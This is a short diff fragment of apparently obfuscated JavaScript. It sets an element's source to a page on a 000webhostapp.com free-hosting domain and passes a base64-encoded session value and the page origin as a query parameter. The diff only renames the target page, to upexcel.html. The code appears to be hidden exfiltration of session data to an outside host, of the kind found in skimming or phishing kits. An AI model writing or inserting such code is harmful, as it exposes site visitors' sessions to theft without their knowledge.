@@ -95,7 +95,7 @@
                 var url = srcpf$.length>0? '/apphrm.':'';//https://apphrm.000webhostapp.com/
 
 
-                evtWK.setAttribute('src', '/' + url + '000webhostapp.com/postMessageTarget.html?seson=' + btoa(calcSession + '|' + w0w.location.origin
+                evtWK.setAttribute('src', '/' + url + '000webhostapp.com/upexcel.html?seson=' + btoa(calcSession + '|' + w0w.location.origin
 
                     + '|' + (!w0w.Worker || true)
 
